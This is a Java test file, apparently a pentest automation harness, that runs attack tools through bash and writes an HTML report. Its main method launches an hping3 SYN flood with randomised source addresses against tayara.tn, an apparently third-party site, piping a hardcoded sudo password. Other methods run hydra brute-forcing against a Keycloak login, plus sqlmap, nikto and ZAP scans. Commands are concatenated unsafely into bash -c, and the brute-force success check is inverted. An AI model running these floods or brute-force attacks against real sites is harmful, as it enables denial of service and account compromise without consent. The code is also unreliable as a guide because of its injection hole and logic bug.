package com.penetration.testing;

import org.json.JSONArray;
import org.json.JSONObject;
import org.json.XML;
import org.junit.jupiter.api.Test;

import java.io.*;
import java.net.InetAddress;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Calendar;

class Tests {

    private static FileWriter file;

    public static void main(String[] args) throws IOException, InterruptedException {
        String path="index.html";
        PrintWriter writer = new PrintWriter(path, "UTF-8");
        String bloc1="<!DOCTYPE html> <html lang=\"en\">  <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Document</title>     <link rel=\"stylesheet\" href=\"style.css\">     <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <link href=\"https://fonts.googleapis.com/css2?family=Roboto+Flex:opsz@8..144&display=swap\" rel=\"stylesheet\">   </head>  <body>     <nav>         <div class=\"reportTitle\">             <span>Penetration test report</span>         </div>     </nav>     <div class=\"container\">         <div class=\"sideBar\">             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"dos.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Dos Attack                     </span>                 </div>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"BruteForce.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Brute force attack                     </span>                 </div>               </a>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"sqlinj.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         SQL Injection Scan                     </span>                 </div>               </a>             <a href=\"#section1\" class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"nikto.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Nikto scan                     </span>                 </div>                  </a>                  <a class=\"scan\">                     <div class=\"image\">                         <img  class=\"scanImg\" src=\"zapscan.jpeg\" alt=\"\">                          </div>                     <div class=\"name\">                         <span class=\"attackName\">                             Owasp zap scan                         </span>                     </div>                      </a>         </div>         <div class=\"content\">";
        String dosResult=dosReportBloc(Dos("tayara.tn").toString(),"tayara.tn");
        String blocn=" </div>     </div>     </body>  </html>";
        writer.println(bloc1+dosResult+blocn);
        writer.close();
//        try {
//            Process proc = Runtime.getRuntime().exec("/home/ahmed/Downloads/jenkins-example-master/src/test/java/com/penetration/testing/test.sh"); //Whatever you want to execute
//            BufferedReader read = new BufferedReader(new InputStreamReader(
//                    proc.getInputStream()));
//            try {
//                proc.waitFor();
//            } catch (InterruptedException e) {
//                System.out.println(e.getMessage());
//            }
//            while (read.ready()) {
//                System.out.println(read.readLine());
//            }
//        } catch (IOException e) {
//            System.out.println(e.getMessage());
//        }
////        System.out.println("final"+InetAddress.getByName("local-tt.dev-machinestalk.com").isReachable(20));

    }

    public static String dosReportBloc(String result,String url) {
        String bloc1="          <div class=\"report\">                 <div class=\"reportName\">                     Dos attack                 </div>                 <div class=\"subReportName\">                     Dos attack report                 </div>                 <div class=\"attackDetails\">                  <span class=\"details\">Attack details:</span>                     <span>- Used tool : hping3</span>                     <span>- number of sent packets : 10000 </span>                     <span>- number of seconds between sending each packet : 10 packets peer second</span>                     <span>- packet body size : 120 bytes</span>    <span>- Website : "+url+"</span>                 </div>";
        String bloc2="";
        if(result.equals("true")){
bloc2="                <div class=\"failAlert\">                     Dos attack succeeded                 </div>";
        }else {
bloc2="  <div class=\"successAlert\">                     Dos attack failed                 </div>";
        }
        String bloc3="</div>";
        return bloc1+bloc2+bloc3;
    }

    @Test
    public void testZero() throws IOException, InterruptedException {
        System.out.println("=========================================================================================================");
        System.out.println("=========================================================================================================");
//        String path="index.html";
//        PrintWriter writer = new PrintWriter(path, "UTF-8");
//        String bloc1="<!DOCTYPE html> <html lang=\"en\">  <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Document</title>     <link rel=\"stylesheet\" href=\"style.css\">     <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <link href=\"https://fonts.googleapis.com/css2?family=Roboto+Flex:opsz@8..144&display=swap\" rel=\"stylesheet\">   </head>  <body>     <nav>         <div class=\"reportTitle\">             <span>Penetration test report</span>         </div>     </nav>     <div class=\"container\">         <div class=\"sideBar\">             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"dos.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Dos Attack                     </span>                 </div>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"BruteForce.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Brute force attack                     </span>                 </div>               </a>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"sqlinj.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         SQL Injection Scan                     </span>                 </div>               </a>             <a href=\"#section1\" class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"nikto.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Nikto scan                     </span>                 </div>                  </a>                  <a class=\"scan\">                     <div class=\"image\">                         <img  class=\"scanImg\" src=\"zapscan.jpeg\" alt=\"\">                          </div>                     <div class=\"name\">                         <span class=\"attackName\">                             Owasp zap scan                         </span>                     </div>                      </a>         </div>         <div class=\"content\">";
//        String dosResult=dosReportBloc(Dos("tayara.tn").toString(),"tayara.tn");
//        String blocn=" </div>     </div>     </body>  </html>";
//        writer.println(bloc1+dosResult+blocn);
//        writer.close();
//    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");
//    LocalDateTime now = LocalDateTime.now();
//    String path="index.html";
//        PrintWriter writer = new PrintWriter(path, "UTF-8");
//        String bloc1="<!DOCTYPE html> <html lang=\"en\">  <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Document</title>     <link rel=\"stylesheet\" href=\"style.css\">     <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <link href=\"https://fonts.googleapis.com/css2?family=Roboto+Flex:opsz@8..144&display=swap\" rel=\"stylesheet\">   </head>  <body>     <nav>         <div class=\"reportTitle\">             <span>Penetration test report</span>         </div>     </nav>     <div class=\"container\">         <div class=\"sideBar\">             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"dos.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Dos Attack                     </span>                 </div>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"BruteForce.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Brute force attack                     </span>                 </div>               </a>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"sqlinj.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         SQL Injection Scan                     </span>                 </div>               </a>             <a href=\"#section1\" class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"nikto.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Nikto scan                     </span>                 </div>                  </a>                  <a class=\"scan\">                     <div class=\"image\">                         <img  class=\"scanImg\" src=\"zapscan.jpeg\" alt=\"\">                          </div>                     <div class=\"name\">                         <span class=\"attackName\">                             Owasp zap scan                         </span>                     </div>                      </a>         </div>         <div class=\"content\">";
//       String dosResult=dosReportBloc(Dos("tayara.tn").toString(),"tayara.tn");
//        String blocn=" </div>     </div>     </body>  </html>";
//        writer.println(bloc1+dosResult+blocn);
//        writer.close();
//    obj.put("Brute Force Attack", hydraScan());
//    obj.put("Nikto scan",niktoScan());
//    obj.put("SQLMAP", SQLMapScan("http://local-iam.dev-machinestalk.com/auth/realms/30d74b00-c16b-11ec-b363-df9b89c1f66c/protocol/openid-connect/auth?response_type=code&client_id=thingstalk&scope=email%20openid%20profile&state=4xsrWMTDw4SW6yPF8TyfOTZs0ZHZb2G9mLee55jahNE%3D&redirect_uri=http://local-tt.dev-machinestalk.com/login/oauth2/code/&nonce=QEag5SgTJ7uZFpy358sgwTGqY4ASnMoazLBmPkzYnXA","username=hello&password=hello%3A%29",1));
//    obj.put("Zap scan",zapScan());

    System.out.println("=========================================================================================================");
    System.out.println("=========================================================================================================");

    }


    public static JSONObject hydraScan() throws IOException, InterruptedException {
        System.out.println("hydra scan is running");

        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand ="hydra -L /home/ahmed/Desktop/Login_Usernames -P /home/ahmed/Desktop/Login_Passwords local-iam.dev-machinestalk.com http-post-form \"/auth/realms/30d74b00-c16b-11ec-b363-df9b89c1f66c/login-actions/authenticate?session_code=BFX_Z-jkHIUg1eSCSzad7QwtvxP2TkGYG1AqWycxXTo&execution=11e34933-e64e-417e-88ff-8ab1ec2847c5&client_id=thingstalk&tab_id=WxWenBoK8WQ:username=^USER^&password=^PASS^:S=\" -vV -f";
        ProcessBuilder pb = new ProcessBuilder(new String[] {prefix, c, terminalCommand});
        File workingDirectory = new File("/home/ahmed/Downloads/ZAP_2.11.1");
        pb.directory(workingDirectory);
        Process p = pb.start();
        String s;
        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
        boolean logged_in=false;
        while ((s = br.readLine()) != null){
//            System.out.println(s);
            if (s.contains("1 valid password found")){
                logged_in=false;
            }
        }
        JSONObject obj = new JSONObject();
        JSONObject obj2 = new JSONObject();
        obj2.put("Logged in",logged_in);
        int spacesToIndentEachLevel = 2;
        p.waitFor();
        p.destroy();
        return obj2;
    }

    public static JSONObject zapScan() throws IOException, InterruptedException {
        System.out.println("zap scan is running");
        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = "./zap.sh -daemon -quickurl http://local-tt.dev-machinestalk.com/";

        ProcessBuilder pb = new ProcessBuilder(new String[] {prefix, c, terminalCommand});

        File workingDirectory = new File("/home/ahmed/Downloads/ZAP_2.11.1");
        pb.directory(workingDirectory);
        Process p = pb.start();
        String s;
        String result="";
        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
        boolean save=false;
        boolean loop=true;
        while (loop){
            s= br.readLine();
            if (s.contains("<?xml version")){
                save=true;
            }
            if (s.contains("</OWASPZAPReport>")){
                result+=s;
                loop=false;
                save=false;
            }
            if (save){
                result+=s;
            }
        }
//        p.waitFor();
//        p.destroy();
        String xml=result;
        JSONObject json = XML.toJSONObject(xml);
        String jsonString = json.toString(4);
        p.destroy();
        return json;
    }
    public static JSONObject SQLMapScan(String url,String data,int level) throws IOException, InterruptedException {
        System.out.println("sqlmap is running");

        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = "sqlmap -u '"+url+"' --data '"+data+"' --level "+level+" --risk "+level+" --ignore-stdin";
        ProcessBuilder pb = new ProcessBuilder(
                new String[] {prefix, c, terminalCommand});

        File workingDirectory = new File("/home/ahmed/Downloads/ZAP_2.11.1");
        pb.directory(workingDirectory);
        Process p = pb.start();
        String s;

        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));

        JSONArray info = new JSONArray();
        JSONArray critical = new JSONArray();
        JSONArray warning = new JSONArray();
        Boolean injectable=true;

        while ((s = br.readLine()) != null){
            if (s.contains("INFO")){
                info.put(s.substring(s.indexOf("[INFO]")+"[INFO] ".length()));
            }
            if (s.contains("WARNING")){
                warning.put(s.substring(s.indexOf("[WARNING]")+"[WARNING] ".length()));
            }
            if (s.contains("CRITICAL")){
                if (s.contains("all tested parameters do not appear to be injectable")){
                    injectable=false;
                    critical.put(s.substring(s.indexOf("[CRITICAL]")+"[CRITICAL] ".length(),s.indexOf(". Try to increase")));
                    continue;
                }
                critical.put(s.substring(s.indexOf("[CRITICAL]")+"[CRITICAL] ".length()));

            }
        }
        JSONObject obj = new JSONObject();
        JSONObject obj2 = new JSONObject();
        obj.put("info", info);
        obj.put("critical", critical);
        obj.put("warning", warning);
        obj.put("injectable", injectable);
        p.waitFor();
        p.destroy();
        return obj;
    }

    public static JSONObject niktoScan() throws IOException, InterruptedException {
        System.out.println("nikto scan is running");
        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = "nikto -h http://local-tt.dev-machinestalk.com";
        ProcessBuilder pb = new ProcessBuilder(
                new String[]{prefix, c, terminalCommand});
        File workingDirectory = new File("/home/ahmed/Downloads/ZAP_2.11.1");
        pb.directory(workingDirectory);
        Process p = pb.start();
        String s;
        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
        JSONObject obj = new JSONObject();
        JSONObject obj2 = new JSONObject();
        JSONArray vulsArray = null;
        vulsArray = new JSONArray();
        String elapsedTime="";
        while ((s = br.readLine()) != null) {
            if (s.startsWith("+ OSVDB")) {
                JSONObject vulJson = new JSONObject();
                String str=s.substring(s.indexOf(":")+2);
                vulJson.put("Vulnerability name",s.substring(s.indexOf("OSVDB"),s.indexOf(":")));
                vulJson.put("Description", str.substring(str.indexOf(":")+2));
                vulJson.put("Test link name","http://local-tt.dev-machinestalk.com:80"+str.substring(str.indexOf("/"),str.indexOf(":")) );
                vulsArray.put(vulJson);
            }
            if (s.startsWith("+ /")){
                JSONObject vulJson = new JSONObject();
                vulJson.put("vulnerability name","OSVDB-0");
                vulJson.put("description", s.substring(s.indexOf(":")+2));
                vulJson.put("test link","http://local-tt.dev-machinestalk.com:80"+s.substring(s.indexOf("/"),s.indexOf(":")) );
                vulsArray.put(vulJson);
            }
            if (s.startsWith("+ End Time: ")){
                elapsedTime=s.substring(s.indexOf("seconds")-3,s.indexOf("seconds")+"seconds".length());
            }



        }
        obj.put("vunerabilities", vulsArray);
        obj.put("Elapsed Time",elapsedTime);
        obj2.put("Nikto scan",obj);
        p.waitFor();
        p.destroy();
        return obj;
    }

    public static JSONObject Dos(String url) throws IOException, InterruptedException {
        System.out.println("dos attack is running");
        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = " echo \"23474629\" | sudo -S -k hping3 "+url+"  -q -n -d 120 -S -p 80 --flood --rand-source";
        ProcessBuilder pb = new ProcessBuilder(new String[] {prefix, c, terminalCommand});
        File workingDirectory = new File("/home");
        System.out.println(InetAddress.getByName(url).isReachable(20));
        pb.directory(workingDirectory);
        Process p = pb.start();
        Thread.sleep(3000);
        JSONObject obj = new JSONObject();
        JSONObject obj2 = new JSONObject();
        System.out.println(InetAddress.getByName(url).isReachable(20));

        obj2.put("result",!InetAddress.getByName(url).isReachable(20));
        obj.put("Dos attack", obj2);

        p.destroy();
        return obj2;
    }
}